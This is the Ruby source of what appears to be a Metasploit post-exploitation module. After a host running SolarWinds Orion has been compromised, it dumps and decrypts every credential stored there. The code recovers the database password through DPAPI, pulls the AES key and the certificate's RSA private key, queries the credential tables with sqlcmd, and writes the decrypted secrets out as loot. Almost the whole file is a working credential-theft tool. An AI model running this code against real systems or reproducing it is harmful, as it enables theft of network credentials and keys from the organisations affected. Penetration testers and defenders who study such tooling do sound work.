##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::MSSQL
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Registry

  Rank = ManualRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SolarWinds Orion Secrets Dump',
        'Description' => %q{
          This module exports and decrypts credentials from SolarWinds Orion Network
          Performance Monitor (NPM) to a CSV file; it is intended as a post-exploitation
          module for Windows hosts with SolarWinds Orion NPM installed. The module
          supports decryption of AES-256, RSA, and XMLSEC secrets. Separate actions for
          extraction and decryption of the data are provided to allow session migration
          during execution in order to log in to the SQL database using SSPI. Tested on
          the 2020 version of SolarWinds Orion NPM. This module is possible only because
          of the source code and technical information published by Rob Fuller and
          Atredis Partners.
        },
        'Author' => [
          'npm[at]cesium137.io', # Metasploit Module
          'Rob Fuller' # @mubix - Original research
        ],
        'Platform' => [ 'win' ],
        'DisclosureDate' => '2022-11-08',
        'SessionTypes' => [ 'meterpreter' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://malicious.link/post/2020/solarflare-release-password-dumper-for-SolarWinds-orion/'],
          ['URL', 'https://github.com/atredispartners/solarwinds-orion-cryptography'],
        ],
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Export SolarWinds Orion database and perform decryption'
            }
          ],
          [
            'Export',
            {
              'Description' => 'Export SolarWinds Orion database without decryption'
            }
          ],
          [
            'Decrypt',
            {
              'Description' => 'Decrypt SolarWinds Orion database export CSV file'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => true
      )
    )
    register_advanced_options([
      OptString.new('CERT_SHA1', [ false, 'Specify SHA-1 thumbprint of Orion SSL Certificate instead of attempting to find by CN']),
      OptPath.new('CSV_FILE', [ false, 'Path to database export CSV file if using the decrypt action' ]),
      OptPath.new('RSA_KEY_FILE', [ false, 'Path to RSA private key file in PEM format if using the decrypt action' ]),
      OptString.new('AES_KEY', [ false, 'Orion AES-256 encryption key in hex' ]),
      OptString.new('MSSQL_INSTANCE', [ false, 'The MSSQL instance path from SolarWinds Orion MSSQL connection string' ]),
      OptString.new('MSSQL_DB', [ false, 'The MSSQL database name from SolarWinds Orion MSSQL connection string' ])
    ])
  end

  def export_header_row
    'CredentialID,Name,Description,CredentialType,CredentialOwner,CredentialPropertyName,Value,Encrypted'
  end

  def result_header_row
    'CredentialID,Name,Description,CredentialType,CredentialOwner,CredentialPropertyName,Plaintext,Method'
  end

  def run
    init_module
    current_action = action.name.downcase
    if current_action == 'export' || current_action == 'dump'
      print_status('Performing export of SolarWinds Orion SQL database to CSV file')
      encrypted_csv_file = export
      print_good("Encrypted SolarWinds Orion Database Dump: #{encrypted_csv_file}")
    end
    if current_action == 'decrypt' || current_action == 'dump'
      encrypted_csv_file ||= datastore['CSV_FILE']
      fail_with(Msf::Exploit::Failure::BadConfig, 'You must set CSV_FILE advanced option') if encrypted_csv_file.nil?

      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid CSV input file') unless ::File.file?(encrypted_csv_file)

      print_status('Performing decryption of SolarWinds Orion SQL database')
      decrypted_csv_file = decrypt(encrypted_csv_file)
      print_good("Decrypted SolarWinds Orion Database Dump: #{decrypted_csv_file}")
    end
  end

  def export
    csv = dump_orion_db
    total_rows = csv.count
    print_good("#{total_rows} rows exported, #{@orion_total_secrets} unique CredentialIDs")
    encrypted_data = csv.to_s.delete("\000")
    store_loot('solarwinds_orion_enc', 'text/csv', rhost, encrypted_data, "#{@orion_db_name}.csv", 'Encrypted Database Dump')
  end

  def decrypt(csv_file)
    csv = read_csv_file(csv_file)
    total_rows = csv.count
    print_good("#{total_rows} rows loaded, #{@orion_total_secrets} unique CredentialIDs")
    result = decrypt_orion_db(csv)
    orion_processed_rows = result[:processed_rows]
    orion_blank_rows = result[:blank_rows]
    orion_decrypted_rows = result[:decrypted_rows]
    orion_plaintext_rows = result[:plaintext_rows]
    orion_failed_rows = result[:failed_rows]
    result_rows = result[:result_csv]
    fail_with(Msf::Exploit::Failure::Unknown, 'Failed to decrypt CSV dataset') unless result_rows

    total_result_rows = result_rows.count - 1 # Do not count header row
    total_result_secrets = result_rows['CredentialID'].uniq.count - 1
    if orion_processed_rows == orion_failed_rows || total_result_rows <= 0
      fail_with(Msf::Exploit::Failure::Unknown, 'No rows could be processed')
    elsif orion_failed_rows > 0
      print_warning("#{orion_processed_rows} rows processed (#{orion_failed_rows} rows failed)")
    else
      print_good("#{orion_processed_rows} rows processed")
    end
    total_records = orion_decrypted_rows + orion_plaintext_rows
    print_status("#{total_records} rows recovered: #{orion_plaintext_rows} plaintext, #{orion_decrypted_rows} decrypted (#{orion_blank_rows} blank)")
    decrypted_data = result_rows.to_s.delete("\000")
    print_status("#{total_result_rows} rows written (#{orion_blank_rows} blank rows withheld)")
    print_good("#{total_result_secrets} unique CredentialID records recovered")
    store_loot('solarwinds_orion_dec', 'text/csv', rhost, decrypted_data, "#{@orion_db_name}.csv", 'Decrypted Database Dump')
  end

  def dump_orion_db
    # CONVERT(VARBINARY()) is an awful hack to get around sqlcmd's equally awful support for CSV output
    sql_query = 'SET NOCOUNT ON;SELECT c.ID AS CredentialID,
      CONVERT(VARBINARY(1024),c.Name) Name,
      CONVERT(VARBINARY(1024),c.Description) Description,
      CONVERT(VARBINARY(256),c.CredentialType) CredentialType,
      CONVERT(VARBINARY(256),c.CredentialOwner) CredentialOwner,
      CONVERT(VARBINARY(1024),cp.Name) CredentialPropertyName,
      CONVERT(VARBINARY(8000),cp.Value) Value,
      cp.Encrypted FROM [dbo].[Credential] AS c JOIN [dbo].[CredentialProperty] AS cp ON (c.ID=cp.CredentialID)'
    sql_cmd = sql_prepare(sql_query)
    print_status('Export SolarWinds Orion DB ...')
    query_result = cmd_exec(sql_cmd)
    if query_result.downcase.start_with?('sqlcmd: error:')
      fail_with(Msf::Exploit::Failure::Unknown, query_result)
    end
    csv = ::CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
    fail_with(Msf::Exploit::Failure::Unknown, 'Error parsing SQL dataset into CSV format') unless csv

    @orion_total_secrets = csv['CredentialID'].uniq.count
    unless @orion_total_secrets >= 1 && !csv['CredentialID'].uniq.first.nil?
      fail_with(Msf::Exploit::Failure::Unknown, 'SQL dataset contains no CredentialID column values')
    end
    csv
  end

  def decrypt_orion_db(csv_dataset)
    fail_with(Msf::Exploit::Failure::Unknown, 'Dataset contains no column values') unless csv_dataset

    current_row = 0
    decrypted_rows = 0
    plaintext_rows = 0
    blank_rows = 0
    failed_rows = 0
    result_csv = ::CSV.parse(result_header_row, headers: :first_row, write_headers: true, return_headers: true)
    print_status('Process SolarWinds Orion DB ...')
    csv_dataset.each do |row|
      current_row += 1
      secret_plaintext = nil
      credential_id = row['CredentialID']
      if credential_id.nil?
        failed_rows += 1
        print_error("Row #{current_row} missing CredentialID column, skipping")
        next
      end
      secret_name = [row['Name'][2..]].pack('H*').delete("\000")
      secret_description = [row['Description'][2..]].pack('H*').delete("\000")
      secret_type = [row['CredentialType'][2..]].pack('H*').delete("\000")
      secret_owner = [row['CredentialOwner'][2..]].pack('H*').delete("\000")
      secret_property_name = [row['CredentialPropertyName'][2..]].pack('H*').delete("\000")
      secret_ciphertext = [row['Value'][2..]].pack('H*').delete("\000")
      if secret_ciphertext.nil?
        vprint_warning("CredentialID #{credential_id} name '#{secret_name}' Value column nil, excluding")
        blank_rows += 1
        next
      end
      secret_encrypted = row['Encrypted'].to_i
      if secret_encrypted == 1
        decrypt_result = orion_secret_decrypt(secret_ciphertext)
        if !decrypt_result.nil?
          secret_plaintext = decrypt_result['Plaintext']
          decrypt_method = decrypt_result['Method']
        else
          print_error("CredentialID #{credential_id} field '#{secret_name}' failed to decrypt")
          vprint_error(row.to_s)
          failed_rows += 1
          next
        end
        if secret_plaintext.nil?
          vprint_warning("CredentialID #{credential_id} name '#{secret_name}' decrypted Value nil, excluding")
          blank_rows += 1
          next
        end
        secret_disposition = "decrypted #{decrypt_method}"
        decrypted_rows += 1
      else
        secret_plaintext = secret_ciphertext
        secret_disposition = 'plaintext'
        decrypt_method = 'Plaintext'
        plaintext_rows += 1
      end
      if !secret_plaintext.empty?
        result_line = [credential_id.to_s, secret_name.to_s, secret_description.to_s, secret_type.to_s, secret_owner.to_s, secret_property_name.to_s, secret_plaintext.to_s, decrypt_method.to_s]
        result_row = ::CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
        result_csv << result_row
        vprint_status("CredentialID #{credential_id} name '#{secret_name}' property '#{secret_property_name}' recovered: #{secret_disposition}")
      else
        vprint_warning("CredentialID #{credential_id} name '#{secret_name}' property '#{secret_property_name}' recovered value empty, excluding")
        blank_rows += 1
      end
    end
    {
      processed_rows: current_row,
      blank_rows: blank_rows,
      decrypted_rows: decrypted_rows,
      plaintext_rows: plaintext_rows,
      failed_rows: failed_rows,
      result_csv: result_csv
    }
  end

  def init_module
    orion_hostname = get_env('COMPUTERNAME')
    print_status("Hostname #{orion_hostname} IPv4 #{rhost}")
    require_sql = action.name.downcase == 'export' || action.name.downcase == 'dump' # only need to be concerned with SQL if doing these actions
    if require_sql
      # TODO: Orion does not install SSMS / sqlcmd by default if it is using an external SQL server.
      # Even when sqlcmd is available we have to do hideous things; MSSQL client functionality built
      # into Exploit does not extend to Post, and trying to mix it in makes weird errors.
      # It may be possible to roll a "SQL client" using PowerShell provided we can stick to native
      # cmdlets but I am not 100% sure that is not reinventing the wheel.
      get_sql_client
      fail_with(Msf::Exploit::Failure::BadConfig, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'

      vprint_good("Found SQL client: #{@sql_client}")
    end
    get_orion_version
    init_orion_encryption
    init_orion_db(get_orion_path) if require_sql
  end

  def read_csv_file(file_name)
    fail_with(Msf::Exploit::Failure::NoTarget, "CSV file #{file_name} not found") unless ::File.file?(file_name)

    csv_rows = ::File.binread(file_name)
    csv = ::CSV.parse(
      csv_rows.gsub("\r", ''),
      row_sep: :auto,
      headers: :first_row,
      quote_char: "\x00",
      skip_blanks: true,
      header_converters: ->(f) { f.strip },
      converters: ->(f) { f ? f.strip : nil }
    )

    fail_with(Msf::Exploit::Failure::NoTarget, "Error importing CSV file #{file_name}") unless csv

    @orion_total_secrets = csv['CredentialID'].uniq.count
    unless @orion_total_secrets >= 1 && !csv['CredentialID'].uniq.first.nil?
      fail_with(Msf::Exploit::Failure::NoTarget, "Provided CSV file #{file_name} contains no CredentialID column values")
    end
    csv
  end

  def get_orion_version
    reg_key = 'HKLM\\SOFTWARE\\WOW6432Node\\SolarWinds\\Orion\\Core'
    fail_with(Msf::Exploit::Failure::NoTarget, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)

    orion_version = registry_getvaldata(reg_key, 'Version')
    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find Version registry entry under #{reg_key}") if orion_version.empty?

    @orion_build = ::Rex::Version.new(orion_version)
    fail_with(Msf::Exploit::Failure::NoTarget, 'Could not parse Orion version information') unless @orion_build > ::Rex::Version.new('0')

    print_status("SolarWinds Orion Build #{@orion_build}")
  end

  def get_orion_path
    reg_key = 'HKLM\\SOFTWARE\\WOW6432Node\\SolarWinds\\Orion\\Core'
    fail_with(Msf::Exploit::Failure::NoTarget, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)

    orion_path = registry_getvaldata(reg_key, 'InstallPath').to_s
    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find InstallPath registry entry under #{reg_key}") if orion_path.empty?

    print_status("SolarWinds Orion Install Path: #{orion_path}")
    orion_path
  end

  def sql_prepare(sql_query)
    if @orion_db_integrated_auth
      sql_cmd = "#{@sql_client} -d \"#{@orion_db_name}\" -S #{@orion_db_instance_path} -E -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I".gsub("\r", '').gsub("\n", '')
    else
      sql_cmd = "#{@sql_client} -d \"#{@orion_db_name}\" -S #{@orion_db_instance_path} -U \"#{@orion_db_user}\" -P \"#{@orion_db_pass}\" -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I".gsub("\r", '').gsub("\n", '')
    end
    sql_cmd
  end

  def read_config_file(config_file)
    fail_with(Msf::Exploit::Failure::NoTarget, "Configuration file '#{config_file}' not found or is not accessible") unless file_exist?(config_file)

    read_file(config_file)
  end

  def get_orion_certificate
    print_status('Extract SolarWinds Orion SSL Certificate Private Key ...')
    if datastore['RSA_KEY_FILE']
      return nil unless ::File.file?(datastore['RSA_KEY_FILE'])

      key_pem = ::File.binread(datastore['RSA_KEY_FILE'])
      @orion_rsa_key = ::OpenSSL::PKey::RSA.new(key_pem)
      vprint_good("Loading SolarWinds Orion RSA private key from file #{datastore['RSA_KEY_FILE']}")
    end
    return nil unless @orion_rsa_key.nil?

    if datastore['CERT_SHA1']
      orion_cert_thumbprint = datastore['CERT_SHA1'].upcase
    else
      cmd_str = "(Get-ChildItem -Path Cert:\\LocalMachine\\My | Where-Object {$_.Subject.ToLower() -eq 'cn=solarwinds-orion'}).Thumbprint"
      orion_cert_thumbprint = psh_exec(cmd_str).upcase
    end
    unless orion_cert_thumbprint.match?(/^[0-9A-F]+$/i)
      print_error('Unable to locate SolarWinds Orion SSL certificate in LocalMachine certificate store, try specifying SHA-1 thumbprint via the CERT_SHA1 advanced option')
      return nil
    end
    vprint_good("Found SolarWinds Orion RSA private key in x509 certificate with SHA1 thumbprint #{orion_cert_thumbprint}")
    cmd_str = "[Convert]::ToBase64String((
      [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey((
      Get-ChildItem -Path Cert:\\LocalMachine\\My\\#{orion_cert_thumbprint})).Key.Export(
      [System.Security.Cryptography.CngKeyBlobFormat]::Pkcs8PrivateBlob)))"
    orion_cert_key = psh_exec(cmd_str)
    unless orion_cert_key.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
      print_error("Unable to extract RSA private key for Orion x509 certificate with SHA1 thumbprint #{orion_cert_thumbprint}")
      return nil
    end
    key_b64 = orion_cert_key.scan(/.{1,64}/).join("\n")
    key_pem = "-----BEGIN PRIVATE KEY-----\n#{key_b64}\n-----END PRIVATE KEY-----"
    @orion_rsa_key = OpenSSL::PKey::RSA.new(key_pem)
    print_good("Extracted SolarWinds Orion RSA private key for LocalMachine certificate with SHA1 thumbprint #{orion_cert_thumbprint}")
    p = store_loot('orionssl', 'x-pem-file', rhost, @orion_rsa_key.to_pem.to_s, 'solarwinds-orion.key', 'SolarWinds Orion RSA Key')
    print_good("SolarWinds Orion RSA Key: #{p}")
    nil
  rescue OpenSSL::PKey::PKeyError
    print_error('Failure during extract of PKCS#1 RSA private key')
    return nil
  end

  def init_orion_encryption
    print_status('Init SolarWinds Crypto ...')
    if datastore['AES_KEY']
      unless datastore['AES_KEY'].match?(/^[0-9a-f]+$/i) && datastore['AES_KEY'].length == 64
        fail_with(Msf::Exploit::Failure::BadConfig, 'Provided AES key is not valid 256-bit / 64-byte hexidecimal data')
      end
      orion_aes_key_hex = datastore['AES_KEY']
      @orion_aes_key = [datastore['AES_KEY']].pack('H*')
    else
      print_status('Decrypt SolarWinds CryptoHelper Keystorage ...')
      orion_enc_config_file = "#{get_env('PROGRAMDATA')}\\SolarWinds\\Keystorage\\CryptoHelper\\default.dat"
      vprint_status('CryptoHelper Keystorage file path:')
      vprint_status("\t#{orion_enc_config_file}")
      fail_with(Msf::Exploit::Failure::BadConfig, "Error reading database configuration file #{orion_enc_config_file}") unless (orion_enc_conf_bytes = read_config_file(orion_enc_config_file))

      key_len = orion_enc_conf_bytes[4..7].unpack('l*').first.to_i
      key_hex_encrypted = orion_enc_conf_bytes[8..key_len + 8]
      orion_enc_conf_b64 = ::Base64.strict_encode64(key_hex_encrypted)
      @orion_aes_key = ::Base64.strict_decode64(dpapi_decrypt(orion_enc_conf_b64, nil))
      orion_aes_key_hex = @orion_aes_key.unpack('H*').first.to_s.upcase
    end
    print_good('Orion AES Encryption Key')
    print_good("\tHEX: #{orion_aes_key_hex}")
    store_valid_credential(user: 'Orion NPM AES Key', private: orion_aes_key_hex, private_type: :nonreplayable_hash)
    get_orion_certificate
    unless @orion_rsa_key
      print_warning('Unable to locate SolarWinds encryption certificate - secrets encrypted with RSA will not be decrypted')
    end
  end

  def init_orion_db(orion_path)
    if datastore['MSSQL_INSTANCE'] && datastore['MSSQL_DB']
      print_status('MSSQL_INSTANCE and MSSQL_DB advanced options set, connect to SQL using SSPI')
      db_instance_path = datastore['MSSQL_INSTANCE']
      db_name = datastore['MSSQL_DB']
      db_auth = 'true'
    else
      print_status('Decrypt SWNetPerfMon.DB ...')
      orion_db_config_file = orion_path + 'SWNetPerfMon.DB'
      vprint_status('SWNetPerfMon.DB file path:')
      vprint_status("\t#{orion_db_config_file}")
      db_conf = get_orion_database_config(read_config_file(orion_db_config_file))
      db_instance_path = db_conf['DATA SOURCE']
      db_name = db_conf['INITIAL CATALOG']
      db_user = db_conf['USER ID']
      db_pass_enc = db_conf['ENCRYPTED.PASSWORD']
      if db_pass_enc.nil?
        db_pass = db_conf['PASSWORD']
      else
        db_pass = ::Base64.strict_decode64(dpapi_decrypt(db_pass_enc.gsub('"', ''), 'AgABAgADAAk=')) # static entropy
      end
      db_auth = db_conf['INTEGRATED SECURITY']
      if db_instance_path.nil? || db_name.nil?
        fail_with(Msf::Exploit::Failure::BadConfig, "Failed to recover database parameters from #{orion_db_config_file}")
      end
    end
    @orion_db_instance_path = db_instance_path
    @orion_db_name = db_name
    @orion_db_integrated_auth = false
    print_good('SolarWinds Orion SQL Database Connection Configuration:')
    print_good("\tInstance Name: #{@orion_db_instance_path}")
    print_good("\tDatabase Name: #{@orion_db_name}")
    if !db_auth.nil?
      if db_auth.downcase == 'true' || db_auth.downcase == 'sspi'
        @orion_db_integrated_auth = true
        print_good("\tDatabase User: (Windows Integrated)")
        print_warning('The database uses Windows authentication')
        print_warning('Session identity must have access to the SQL server instance to proceed')
      end
    elsif !db_user.nil? && !db_pass.nil?
      @orion_db_user = db_user
      @orion_db_pass = db_pass
      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 1433,
        service_name: 'mssql',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: @orion_db_instance_path
      }
      store_valid_credential(user: @orion_db_user, private: @orion_db_pass, service_data: extra_service_data)
      print_good("\tDatabase User: #{@orion_db_user}")
      print_good("\tDatabase Pass: #{@orion_db_pass}")
    else
      fail_with(Msf::Exploit::Failure::Unknown, "Could not extract SQL login information from #{orion_db_config_file}")
    end
  end

  def get_orion_database_config(db_conf_bytes)
    res = {}
    db_str = get_orion_database_string(db_conf_bytes)
    fail_with(Msf::Exploit::Failure::Unknown, 'Could not extract ConnectionString from binary stream') unless db_str

    db_connection_elements = db_str.split(';')
    db_connection_elements.each do |element|
      pair = element.to_s.split('=', 2)
      k = pair[0]
      v = pair[1]
      res[k.upcase] = v
    end
    res
  end

  def get_orion_database_string(plaintext_conf)
    return nil unless plaintext_conf.match?(/ConnectionString/i)

    start_offset = plaintext_conf.index(/ConnectionString/i) + 17
    end_offset = plaintext_conf.index("\n", start_offset) - 1
    plaintext_conf[start_offset..end_offset]
  end

  def orion_secret_decrypt(ciphertext)
    if ciphertext.start_with?('<') # This is XMLSEC
      unless @orion_rsa_key
        print_warning('RSA key unavailable, cannot decrypt XMLSEC ciphertext')
        vprint_warning("Ciphertext: #{ciphertext}")
        return nil
      end
      xmldoc = Nokogiri::XML(ciphertext) do |config|
        config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
      end
      return nil unless xmldoc

      xmldoc.remove_namespaces!
      key_b64 = xmldoc.at_xpath('/EncryptedData/KeyInfo/EncryptedKey/CipherData/CipherValue').text.delete("\000")
      encrypted_bytes = ::Base64.strict_decode64(xmldoc.at_xpath('/EncryptedData/CipherData/CipherValue').text.delete("\000"))
      item_key = @orion_rsa_key.decrypt(::Base64.strict_decode64(key_b64))
      iv = encrypted_bytes[0..15]
      ciphertext = encrypted_bytes[16..]
      if (secret_plaintext = aes_cbc_decrypt(ciphertext, item_key, iv))
        secret_plaintext = secret_plaintext.delete("\000")
        secret_method = 'XMLSEC'
      end
    elsif ciphertext.start_with?('-') # This is AES-256
      encrypted_bytes = ::Base64.strict_decode64(ciphertext.split('-enc-')[1].split('-')[1])
      iv = encrypted_bytes[0..15]
      ciphertext = encrypted_bytes[16..]
      secret_plaintext = aes_cbc_decrypt(ciphertext, @orion_aes_key, iv)
      secret_method = 'AES'
    elsif ciphertext.match?(%r{^[-A-Za-z0-9+/]*={0,3}$}) # This is RSA
      unless @orion_rsa_key
        print_warning('RSA key unavailable, cannot decrypt RSA encrypted ciphertext')
        vprint_warning("Ciphertext: #{ciphertext}")
        return nil
      end
      secret_plaintext = @orion_rsa_key.decrypt(::Base64.strict_decode64(ciphertext.to_s))
      secret_method = 'RSA'
    else # This is something we've never seen before
      print_error('Could not determine encryption type, unable to decrypt')
      vprint_error("Ciphertext: #{ciphertext}")
    end
    if secret_plaintext && secret_method
      res = { 'Plaintext' => secret_plaintext.delete("\000"), 'Method' => secret_method }
    else
      res = nil
    end
    return res
  rescue ArgumentError
    return nil
  end

  def aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv)
    return nil unless aes_iv.length == 16

    case aes_key.length
    when 16
      decipher = OpenSSL::Cipher.new('aes-128-cbc')
    when 32
      decipher = OpenSSL::Cipher.new('aes-256-cbc')
    else
      return nil
    end
    decipher.decrypt
    decipher.key = aes_key
    decipher.iv = aes_iv
    decipher.padding = 1
    decipher.update(ciphertext_bytes) + decipher.final
  rescue OpenSSL::Cipher::CipherError
    return nil
  end

  def dpapi_decrypt(b64, entropy)
    unless b64.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
      print_error('DPAPI decrypt: invalid Base64 ciphertext')
      return nil
    end
    if entropy
      unless entropy.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
        print_error('DPAPI decrypt: invalid Base64 entropy value')
        return nil
      end
      unprotect_param = "[Convert]::FromBase64String('#{entropy}')"
    else
      unprotect_param = '$Null'
    end
    cmd_str = "Add-Type -AssemblyName System.Security;[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{b64}'), #{unprotect_param}, 'LocalMachine'))"
    plaintext = psh_exec(cmd_str)
    unless plaintext.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
      print_error('Bad DPAPI decrypt')
      vprint_error("Ciphertext: #{b64}")
      return nil
    end
    plaintext
  end
end
